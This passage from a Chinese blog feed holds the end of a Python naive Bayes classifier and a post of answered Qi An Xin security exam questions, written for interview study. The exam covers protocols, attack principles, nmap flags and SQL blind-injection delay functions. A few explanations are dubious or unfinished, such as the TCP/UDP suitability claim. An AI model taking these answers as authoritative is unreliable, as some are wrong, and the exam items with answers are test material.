class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CreateData</span>():</span><br><span class="line">    sampleset = [[<span class="string">&#x27;青绿&#x27;</span>,<span class="string">&#x27;蜷缩&#x27;</span>,<span class="string">&#x27;浊响&#x27;</span>,<span class="string">&#x27;清晰&#x27;</span>,<span class="string">&#x27;凹陷&#x27;</span>,<span class="string">&#x27;硬滑&#x27;</span>,<span class="string">&#x27;是&#x27;</span>],</span><br><span class="line">                 [<span class="string">&#x27;乌黑&#x27;</span>,<span class="string">&#x27;蜷缩&#x27;</span>,<span class="string">&#x27;沉闷&#x27;</span>,<span class="string">&#x27;清晰&#x27;</span>,<span class="string">&#x27;凹陷&#x27;</span>,<span class="string">&#x27;硬滑&#x27;</span>,<span class="string">&#x27;是&#x27;</span>],</span><br><span class="line">                 [<span class="string">&#x27;乌黑&#x27;</span>,<span class="string">&#x27;蜷缩&#x27;</span>,<span class="string">&#x27;浊响&#x27;</span>,<span class="string">&#x27;清晰&#x27;</span>,<span class="string">&#x27;凹陷&#x27;</span>,<span class="string">&#x27;硬滑&#x27;</span>,<span class="string">&#x27;是&#x27;</span>],</span><br><span class="line">                 [<span class="string">&#x27;青绿&#x27;</span>,<span class="string">&#x27;蜷缩&#x27;</span>,<span class="string">&#x27;沉闷&#x27;</span>,<span class="string">&#x27;清晰&#x27;</span>,<span class="string">&#x27;凹陷&#x27;</span>,<span class="string">&#x27;硬滑&#x27;</span>,<span class="string">&#x27;是&#x27;</span>],</span><br><span class="line">                 [<span class="string">&#x27;浅白&#x27;</span>,<span class="string">&#x27;蜷缩&#x27;</span>,<span class="string">&#x27;浊响&#x27;</span>,<span class="string">&#x27;清晰&#x27;</span>,<span class="string">&#x27;凹陷&#x27;</span>,<span class="string">&#x27;硬滑&#x27;</span>,<span class="string">&#x27;是&#x27;</span>],</span><br><span class="line">                 [<span class="string">&#x27;青绿&#x27;</span>,<span class="string">&#x27;稍蜷&#x27;</span>,<span class="string">&#x27;浊响&#x27;</span>,<span class="string">&#x27;清晰&#x27;</span>,<span class="string">&#x27;稍凹&#x27;</span>,<span class="string">&#x27;软粘&#x27;</span>,<span class="string">&#x27;是&#x27;</span>],</span><br><span class="line">                 [<span class="string">&#x27;乌黑&#x27;</span>,<span class="string">&#x27;稍蜷&#x27;</span>,<span class="string">&#x27;浊响&#x27;</span>,<span class="string">&#x27;稍糊&#x27;</span>,<span class="string">&#x27;稍凹&#x27;</span>,<span class="string">&#x27;软粘&#x27;</span>,<span class="string">&#x27;是&#x27;</span>],</span><br><span class="line">                 [<span class="string">&#x27;乌黑&#x27;</span>,<span class="string">&#x27;稍蜷&#x27;</span>,<span class="string">&#x27;浊响&#x27;</span>,<span class="string">&#x27;清晰&#x27;</span>,<span class="string">&#x27;稍凹&#x27;</span>,<span class="string">&#x27;硬滑&#x27;</span>,<span class="string">&#x27;是&#x27;</span>],</span><br><span class="line">                 [<span class="string">&#x27;乌黑&#x27;</span>,<span class="string">&#x27;稍蜷&#x27;</span>,<span class="string">&#x27;沉闷&#x27;</span>,<span class="string">&#x27;稍糊&#x27;</span>,<span class="string">&#x27;稍凹&#x27;</span>,<span class="string">&#x27;硬滑&#x27;</span>,<span class="string">&#x27;否&#x27;</span>],</span><br><span class="line">                 [<span class="string">&#x27;青绿&#x27;</span>,<span class="string">&#x27;硬挺&#x27;</span>,<span class="string">&#x27;清脆&#x27;</span>,<span class="string">&#x27;清晰&#x27;</span>,<span class="string">&#x27;平坦&#x27;</span>,<span class="string">&#x27;软粘&#x27;</span>,<span class="string">&#x27;否&#x27;</span>],</span><br><span class="line">                 [<span class="string">&#x27;浅白&#x27;</span>,<span class="string">&#x27;硬挺&#x27;</span>,<span class="string">&#x27;清脆&#x27;</span>,<span class="string">&#x27;模糊&#x27;</span>,<span class="string">&#x27;平坦&#x27;</span>,<span class="string">&#x27;硬滑&#x27;</span>,<span class="string">&#x27;否&#x27;</span>],</span><br><span class="line">                 [<span class="string">&#x27;浅白&#x27;</span>,<span class="string">&#x27;蜷缩&#x27;</span>,<span class="string">&#x27;浊响&#x27;</span>,<span class="string">&#x27;模糊&#x27;</span>,<span class="string">&#x27;平坦&#x27;</span>,<span class="string">&#x27;软粘&#x27;</span>,<span class="string">&#x27;否&#x27;</span>],</span><br><span class="line">                 [<span class="string">&#x27;青绿&#x27;</span>,<span class="string">&#x27;稍蜷&#x27;</span>,<span class="string">&#x27;浊响&#x27;</span>,<span class="string">&#x27;稍糊&#x27;</span>,<span class="string">&#x27;凹陷&#x27;</span>,<span class="string">&#x27;硬滑&#x27;</span>,<span class="string">&#x27;否&#x27;</span>],</span><br><span class="line">                 [<span class="string">&#x27;浅白&#x27;</span>,<span class="string">&#x27;稍蜷&#x27;</span>,<span class="string">&#x27;沉闷&#x27;</span>,<span class="string">&#x27;稍糊&#x27;</span>,<span class="string">&#x27;凹陷&#x27;</span>,<span class="string">&#x27;硬滑&#x27;</span>,<span class="string">&#x27;否&#x27;</span>],</span><br><span class="line">                 [<span class="string">&#x27;乌黑&#x27;</span>,<span class="string">&#x27;稍蜷&#x27;</span>,<span class="string">&#x27;浊响&#x27;</span>,<span class="string">&#x27;清晰&#x27;</span>,<span class="string">&#x27;稍凹&#x27;</span>,<span class="string">&#x27;软粘&#x27;</span>,<span class="string">&#x27;否&#x27;</span>],</span><br><span class="line">                 [<span class="string">&#x27;浅白&#x27;</span>,<span class="string">&#x27;蜷缩&#x27;</span>,<span class="string">&#x27;浊响&#x27;</span>,<span class="string">&#x27;模糊&#x27;</span>,<span class="string">&#x27;平坦&#x27;</span>,<span class="string">&#x27;硬滑&#x27;</span>,<span class="string">&#x27;否&#x27;</span>],</span><br><span class="line">                 [<span class="string">&#x27;青绿&#x27;</span>,<span class="string">&#x27;蜷缩&#x27;</span>,<span class="string">&#x27;沉闷&#x27;</span>,<span class="string">&#x27;稍糊&#x27;</span>,<span class="string">&#x27;稍凹&#x27;</span>,<span class="string">&#x27;硬滑&#x27;</span>,<span class="string">&#x27;否&#x27;</span>]]</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#注意路径</span></span><br><span class="line">    <span class="comment">#filename = &quot;./西瓜3.0.csv&quot;</span></span><br><span class="line">    <span class="comment">#sampleset = []</span></span><br><span class="line">    <span class="comment">#with open(filename) as f:</span></span><br><span class="line">    <span class="comment">#    #csv.reader()读取文件中的每行作为列表返回，reader相当于指向那堆列表的指针</span></span><br><span class="line">    <span class="comment">#    reader = csv.reader(f)</span></span><br><span class="line">    <span class="comment">#    #读取首行并将reader指针指向下一行</span></span><br><span class="line">    <span class="comment">#    header_row = next(reader)</span></span><br><span class="line">    <span class="comment">#    #遍历reader指针指向的那堆列表，将每个列表中下标为1至末尾的元素作为新列表加入到样本集中</span></span><br><span class="line">    <span class="comment">#    for line in reader:</span></span><br><span class="line">    <span class="comment">#        sampleset.append(line[1:])</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> sampleset</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DataPreprocessing</span>(<span class="params">sampleset</span>):</span><br><span class="line">    <span class="comment">#将样本集打乱</span></span><br><span class="line">    random.shuffle(sampleset)</span><br><span class="line">    <span class="comment">#90%作为训练集，10%作为测试集</span></span><br><span class="line">    split_index = <span class="built_in">int</span>(<span class="built_in">len</span>(sampleset)*<span class="number">0.9</span>)</span><br><span class="line">    trainset = sampleset[:split_index]</span><br><span class="line">    testset = sampleset[split_index:]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> trainset, testset</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Bayes</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, trainset, testset, n=<span class="number">1</span></span>):</span><br><span class="line">        self.trainset = trainset</span><br><span class="line">        self.testset = testset</span><br><span class="line">        self.n = n</span><br><span class="line"></span><br><span class="line">    <span class="comment">#计算先验概率</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">cal_prior_prob</span>(<span class="params">self, trainset</span>):</span><br><span class="line">        labellist = [trainset[i][-<span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(trainset))]</span><br><span class="line">        labeldict = &#123;&#125;</span><br><span class="line">        <span class="comment">#按类别分类并且计算各类别的样本数</span></span><br><span class="line">        <span class="keyword">for</span> label <span class="keyword">in</span> labellist:</span><br><span class="line">            <span class="keyword">if</span> label <span class="keyword">not</span> <span class="keyword">in</span> labeldict:</span><br><span class="line">                labeldict[label] = <span class="number">0</span></span><br><span class="line">            labeldict[label] += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#计算各类别的先验概率</span></span><br><span class="line">        labelpriorprob = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> label <span class="keyword">in</span> labeldict.keys():</span><br><span class="line">            labelpriorprob[label] = (labeldict[label] + self.n) / (<span class="built_in">len</span>(trainset) + <span class="built_in">len</span>(self.testset) * self.n)</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;类别的先验概率为：&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(labelpriorprob)</span><br><span class="line">        <span class="keyword">return</span> labelpriorprob</span><br><span class="line">        </span><br><span class="line">    <span class="comment">#计算条件概率</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">cal_cond_prob</span>(<span class="params">self, trainset</span>):</span><br><span class="line">        <span class="comment">#fea_num表示特征数，-1是减去最后那个类别，它不属于特征</span></span><br><span class="line">        fea_num = <span class="built_in">len</span>(trainset[<span class="number">0</span>]) - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#用二维数组存储每个特征有哪几个特征值</span></span><br><span class="line">        fealist = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(fea_num):</span><br><span class="line">            fealist.append([])</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(trainset)):</span><br><span class="line">                <span class="keyword">if</span> trainset[j][i] <span class="keyword">not</span> <span class="keyword">in</span> fealist[i]:</span><br><span class="line">                    fealist[i].append(trainset[j][i])</span><br><span class="line">        <span class="comment">#print(fealist)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#按类别区分训练集</span></span><br><span class="line">        separated = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(trainset)):</span><br><span class="line">            row_vetor = trainset[i]</span><br><span class="line">            <span class="keyword">if</span> row_vetor[-<span class="number">1</span>] <span class="keyword">not</span> <span class="keyword">in</span> separated:</span><br><span class="line">                separated[row_vetor[-<span class="number">1</span>]] = []</span><br><span class="line">            separated[row_vetor[-<span class="number">1</span>]].append(row_vetor[:-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">        <span class="comment">#创建一个字典存各个特征值的条件概率</span></span><br><span class="line">        feacondprob = &#123;&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">#每个特征中又有不同的特征值</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> separated.keys():<span class="comment">#i表示字典中的关键字“是”或“否”</span></span><br><span class="line">            <span class="comment">#“是”一个列表，“否”一个列表，最后综合到feacondprob字典中</span></span><br><span class="line">            temp = []</span><br><span class="line">            <span class="built_in">print</span>()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;&#x27;&#123;0&#125;&#x27;类别的各特征的条件概率为：&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(fea_num):<span class="comment">#k表示样本中有多少个特征</span></span><br><span class="line">                <span class="comment">#每个特征创建一个字典计算不同特征值的个数</span></span><br><span class="line">                feadict = &#123;&#125;</span><br><span class="line">                <span class="comment">#初始化字典关键字</span></span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(fealist[k])):</span><br><span class="line">                    <span class="keyword">if</span> fealist[k][j] <span class="keyword">not</span> <span class="keyword">in</span> feadict:</span><br><span class="line">                        feadict[fealist[k][j]] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(separated[i])):<span class="comment">#这里的j表示在“是”或“否”中的第j个样本                    </span></span><br><span class="line">                    feadict[separated[i][j][k]] += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">#计算各特征的条件概率</span></span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> feadict.keys():</span><br><span class="line">                    feadict[j] = (feadict[j] + self.n) / (<span class="built_in">len</span>(separated[i]) + <span class="built_in">len</span>(feadict) * self.n)</span><br><span class="line">                </span><br><span class="line">                <span class="built_in">print</span>(feadict)</span><br><span class="line">                </span><br><span class="line">                temp.append(feadict)</span><br><span class="line">            </span><br><span class="line">            feacondprob[i] = temp</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> feacondprob</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">predict</span>(<span class="params">self, trainset, testset</span>):</span><br><span class="line">        labelpriorprob = self.cal_prior_prob(trainset)</span><br><span class="line">        feacondprob = self.cal_cond_prob(trainset)</span><br><span class="line">        testlabels = []</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(testset)):<span class="comment">#i表示测试集样本的个数</span></span><br><span class="line">            bayesProbability = &#123;&#125;</span><br><span class="line">            <span class="keyword">for</span> label <span class="keyword">in</span> labelpriorprob:</span><br><span class="line">                tempProb = labelpriorprob[label]</span><br><span class="line">                featureList = feacondprob[label]</span><br><span class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(testset[<span class="number">0</span>])-<span class="number">1</span>):<span class="comment">#k表示要计算几个特征</span></span><br><span class="line">                    tempProb *= featureList[k][testset[i][k]]</span><br><span class="line">                </span><br><span class="line">                bayesProbability[label] = tempProb</span><br><span class="line">            </span><br><span class="line">            result = <span class="built_in">sorted</span>(bayesProbability.items(), key=<span class="keyword">lambda</span> x:x[<span class="number">1</span>], reverse=<span class="literal">True</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;测试样本&#123;0&#125;的各类别概率：&quot;</span>.<span class="built_in">format</span>(i),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">            <span class="built_in">print</span>()</span><br><span class="line">            testlabels.append(result[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> testlabels</span><br><span class="line">            </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    sampleset = CreateData()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;样本集为：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(sampleset)</span><br><span class="line">    trainset, testset = DataPreprocessing(sampleset)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;其中训练集为：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(trainset)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;其中测试集为：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(testset)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#用极大似然法估计参数</span></span><br><span class="line">    bayes = Bayes(trainset, testset, n=<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;使用最大似然法判断测试集类别：&quot;</span>)</span><br><span class="line">    testlabels = bayes.predict(trainset, testset)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;测试集各实例点的最终结果：&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(testlabels))</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#用拉普拉斯平滑估计参数（默认）</span></span><br><span class="line">    bayes = Bayes(trainset, testset, n=<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;使用拉普拉斯平滑判断测试集类别：&quot;</span>)</span><br><span class="line">    testlabels = bayes.predict(trainset, testset)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;测试集各实例点的最终结果：&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(testlabels))</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;做的时候很痛苦，但完全是自己写出来的算法真的很有成就感呜呜呜！感谢简博士清晰易懂的例题讲解，让我懂得它的原理。&lt;/p&gt;
&lt;p&gt;经过这个算法我也清楚了Python列表与字典该在哪种情况下使用哪个，非常不错~&lt;/p&gt;</summary>
    
    
    
    <category term="算法" scheme="http://example.com/categories/%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="机器学习" scheme="http://example.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>奇安信安全方向笔试题</title>
    <link href="http://example.com/posts/7b52fae7.html"/>
    <id>http://example.com/posts/7b52fae7.html</id>
    <published>2022-05-06T04:40:43.409Z</published>
    <updated>2022-05-07T14:42:37.259Z</updated>
    
    <content type="html"><![CDATA[<p>笔试主要内容：网络协议、操作系统、攻击原理</p><p>认真对待每次笔试和面试，积累经验，小凉一定不会失业的！一定可以找到适合自己的工作的！</p><span id="more"></span><h1 id="【2020】奇安信秋招研发安全方向试卷1"><a href="#【2020】奇安信秋招研发安全方向试卷1" class="headerlink" title="【2020】奇安信秋招研发安全方向试卷1"></a>【2020】奇安信秋招研发安全方向试卷1</h1><p>1.以下哪些字段不是IP头部中的内容( D )</p><p>A. 版本、报文长度；B. 服务类型、标识；C. 源地址、目标地址；D. 源端口、目标端口</p><p>解析：</p><img src="/posts/7b52fae7/1.1.1.png" class="" title="IP头部结构"><p>2.下列选项中，TCP标志位组合不正确的是( C )</p><p>A. SYN+ACK；B. PUSH+ACK；C. SYN+RST；D. FIN+ACK</p><p>解析：没有[SYN, RST]包，有[RST, ACK]包。</p><p>3.TCP SYN拒绝服务攻击是指发起TCP链接后不管，重复不停发送链接。</p><p>4.分片IP报文攻击是指将大报文拆分成小报文片段，只发送一部分给被攻击者。</p><p>5.永恒之蓝利用Windows系统的SMB协议漏洞来获取系统的最高权限，以此来控制被入侵的计算机。</p><p>6.ARP攻击造成网络无法跨网段通信的原因是伪造网关 ARP 报文使得数据包无法发送到网关。</p><p>7.Ping of death攻击的原理是操作系统平台未对分片进行参数检查。</p><p>8.Linux下可用的抓包工具是tcpdump、tshark和wireshark。</p><p>9.nmap扫描参数中，T5参数扫描最快。</p><p>解析：nmap的常见参数汇总：<br>端口状态概述<br>open 开放；closed 关闭；filtered 被过滤掉了，无法进行判断；unfiltered 未被过滤可以进行访问</p><p>参数：<br>1、-Pn 跳过主机发现，视为所有的主机都在线<br>2、-sn 只做ping扫描不做端口扫描<br>3、-sT\A\W\M 不同的扫描端口，进行扫描<br>4、-p 指定端口进行扫描 —exclude-ports<port ranges>：排除端口进行扫描<br>5、-sV 探测系统的版本<br>—version-intensity<level>：设置相关的程度，详细级别，0~9 越高越详细<br>—version-trace：打印详细的版本扫描过程<br>6、脚本扫描<br>—scri=<scripts> ：指定对应的脚本名称<br>7、O：激活系统的探测<br>—osscan-limit：只对开放端口的有效主机进行系统的探测<br>8、-T<0-5>：时间模板，越大速度越快<br>9、-6：使能IPV6探测<br>10、-A：使能系统探测、版本检测、脚本扫描、路由追踪<br>11、-V：打印版本号<br>12、-v：增加输出的详细程度</p><p>10.以下哪个不是PE文件结构( D )</p><p>A. 导入表；B. 导出表；C. 重定位表；D. 字符串表</p><p>解析：PE文件结构分为五个部分：DOS文件头、DOS加载模块、PE文件头、区段表、区段。区段表相当于区段的目录，里面包含着每个区段的信息。</p><blockquote><p>.text：代码段，是在编译或汇编结束时产生的一种块，它的内容全部是指令代码。也有的编译器将该段命名为.code<br>.data：初始化的数据块，包含那些编译时被初始化的变量、字符串<br>.idata：导入表，包含程序调用的第三方dll的函数的信息。<br>.rsrc：资源数据块，包含模块的全部资源数据，如图标、菜单、位图等。<br>.reloc：重定位表，用于保存基址的重定位表。即当装载程序不能按照连接器所指定的地址装载文件时，需要对指令或已经初始化的变量进行调整，该块中也包含了调整过程中所需要的一些数据，如果装载能够正常装载则忽略此段中的数据。<br>.edata：导出表，是pe文件的输出表，以供其他模块使用，并不是每个pe文件都有此数据段，因为有的文件并不需要输出一些函数，该数据段常见于动态链接库文件中。<br>.rdata：系统函数的导入表，程序调用的系统dll中的函数的具体信息。</p></blockquote><p>11.当前进程页目录地址保存在CR3中。</p><p>解析：</p><img src="/posts/7b52fae7/1.11.1.png" class="" title="控制寄存器"><p><strong>CR0</strong><br>是系统内的控制寄存器之一。控制寄存器是一些特殊的寄存器，它们可以控制CPU的一些重要特性。<br>第0位是保护允许位PE(Protedted Enable)，用于启动保护模式，如果PE位置1，则保护模式启动，如果PE=0，则在实模式下运行。<br>第1位是监控协处理位MP(Moniter coprocessor)，它与第3位一起决定：当TS=1时操作码WAIT是否产生一个“协处理器不能使用”的出错信号。第3位是任务转换位(Task Switch)，当一个任务转换完成之后，自动将它置1。随着TS=1，就不能使用协处理器。<br>第2位是模拟协处理器位 EM (Emulate coprocessor)，如果EM=1，则不能使用协处理器，如果EM=0，则允许使用协处理器。<br>第4位是微处理器的扩展类型位 ET(Processor Extension Type)，其内保存着处理器扩展类型的信息，如果ET=0，则标识系统使用的是287协处理器，如果 ET=1，则表示系统使用的是387浮点协处理器。<br>第31位是分页允许位(Paging Enable)，它表示芯片上的分页部件是否允许工作。<br>第16位是写保护未即WP位(486系列之后)，只要将这一位置0就可以禁用写保护，置1则可将其恢复。</p><p><strong>CR1</strong><br>是未定义的控制寄存器，供将来的处理器使用。</p><p><strong>CR2</strong><br>是页故障线性地址寄存器，保存最后一次出现页故障的全32位线性地址。</p><p><strong>CR3</strong><br>是页目录基址寄存器，保存页目录表的物理地址，页目录表总是放在以4K字节为单位的存储器边界上，因此，它的地址的低12位总为0，不起作用，即使写上内容，也不会被理会。</p><p><strong>CR4</strong><br>在Pentium系列（包括486的后期版本）处理器中才实现，它处理的事务包括诸如何时启用虚拟8086模式等。</p><p>12.以下哪个选项用于解决缓解间接调用和调用不可靠目标的问题( D )</p><p>A. ASLR；B. EDP；C. GS； D. CFG</p><p>解析：CFG（Control Flow Guard）控制流防护，是微软在Windows8.0以及Windows10上推出的新的防护机制。防护点在于，防护间接调用，防止在程序间接调用函数的时候，使用恶意代码进行替换，导致执行恶意程序。CFG的实现机制在于每当存在间接调用的函数的时候，就会先去判断一下间接调用的地址处是不是一个有效的函数的起始地址。</p><p>13.Windbg中通过哪条命令监控指定dll加载( A )</p><p>A. sxe；B. lm；C. reload；D. pct</p><p>解析：</p><p>sxe：与dll加载有关</p><p>lm：用来查看库的信息，比如库的路径、时间戳、库的加载地址等。一般使用模糊匹配的模式。</p><p>.reload：删除指定模块的所有符号信息，并且按需要重新加载这些符号。</p><p>pct：执行程序，直到它到达调用指令或返回指令。</p><p>14.WEB漏洞扫描工具通过网络爬虫测试web应用系统，检测常见的Web应用漏洞。常见的WEB漏洞扫描工具有：AppScan、Netsparker、Nikto、WebInspect。</p><p>15.关于OWASP Top 10 2017 十项最严重的Web 应用程序安全风险，以下哪种漏洞类型不在范围内？( E )</p><p>A. 不安全的反序列化；B. XML外部实体注入；C. 使用了已知漏洞的组件；D. 敏感数据泄露；E. SSTI</p><p>具体看<a href="https://blog.csdn.net/lilongsy/article/details/79761362">OWASP Top 10 2017 10项最严重的 Web 应用程序安全风险</a></p><p>SSTI是服务器端模板注入(Server-Side Template Injection)，实际上也是一种注入漏洞。引发SSTI的真正原因是<code>render_template</code>渲染函数的问题，渲染函数在渲染的时候，往往对用户输入的变量不做渲染。</p><p>16.对一个文件的访问，常由用户访问权限和文件属性共同限制。</p><p>17.TCP是面向连接的，UDP是面向无连接的；TCP适用于可靠性较高的局域网，UDP适用于可靠性较差的广域网。</p><p>18.面向对象的三大特性：封装、继承、多态。</p><p>面向对象的七(或五大原则，前五项)大基本原则：单一职责原则（Single Function Principle, SFP） 、开放封闭原则（Open-Closed Principle, OCP）  、里氏替换原则（Liskov Substitution Principle, LSP）、  依赖倒置原则（Dependency Inversion Principle, DIP）、接口隔离原则（Inteface Segregation Principle, ISP）、迪米特法则（Law of Demeter, LoD）、组合/聚合复用原则（Composite/Aggregate Reuse Principle, CARP）。详细请看<a href="https://blog.csdn.net/qq_37234501/article/details/115273019">面对对象七大原则</a></p><p>19.以下程序在little-endian架构处理器下的输出是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="type">char</span> *pc = &amp;i;</span><br><span class="line">pc[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, i);</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">1</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>20.volatile是一个特征修饰符（type specifier）。volatile的作用是作为指令关键字，确保本条指令不会因编译器的优化而省略，且要求每次直接读值。一个变量可以既是const又是volatile。一个指针可以是volatile。当gcc -O0时，volatile起不到作用，因为-O0表示不做任何优化，这是默认的编译选项。</p><p>21.常见的 Web 攻击手段主要有 XSS 攻击、CSRF 攻击、SQL 注入攻击、DDos 攻击、文件漏洞攻击等。</p><p>22.系统入侵攻击的方式有口令攻击、漏洞攻击、木马攻击、后门攻击。</p><p>23.选用比较长和复杂的用户登录口令、使用防病毒软件、尽量避免开放过多的网络服务能减少用户计算机被攻击的可能性。</p><p>24.监听0~1023端口都需要root权限。</p><p>25.修改free hook 等插入的函数指针、非线性修改函数返回地址、使用函数指针进行覆写可能导致Windows 10 上控制流劫持。</p><p>26.内存破坏类漏洞调试分析中的常见技巧有开启heap相关检测选项、内存访问断点、条件断点。</p><p>27.哪些函数或语句是SQL延迟盲注利用中会用到？sleep、benchmark、DBMS_PIPE.RECEIVE_MESSAGE、WAITFOR DELAY。</p><p>28.进出栈顺序，简单。</p><p>29.各种排序算法<strong>空间复杂度</strong>：</p><p>插入排序 = 冒泡排序 = 堆排序 = $O(1)$</p><p>快速排序 = $O(\log N)$</p><p>30.接口是通用的，用来描述方法是干什么用的，方法的默认修饰符为public、abstract。不可以为final是因为方法要被重写。描述符如果为private或者protected，那么子类重写的方法的描述符也可以为private或者protected，这样就是有了访问限制，不符合接口所要达到的的任何人都可以使用的原则。</p><p>31.老板一共需要给某个员工发奖金n元，可以选择一次发1元，也可以选择一次发2元，也可以选择一次发3元。请问老板给这位员工发放完n元奖金共有多少种不同的方法？数据范围：1 &lt;= n &lt;= 10</p><p>分析：可以这样想，发5元怎么发？<strong>不对，再说吧</strong><br>1：先发1块的情况下，剩下4块是不是就和发4块的方法一样了？<br>2：先发2块的情况下，剩下3块是不是就和发3块的方法一样了？<br>3：先发3块的情况下，剩下2块是不是就和发2块的方法一样了？<br>4：先发4块的情况下，剩下1块是不是就和发1块的方法一样了？<br>5：5块一次性发完，唯一方法</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 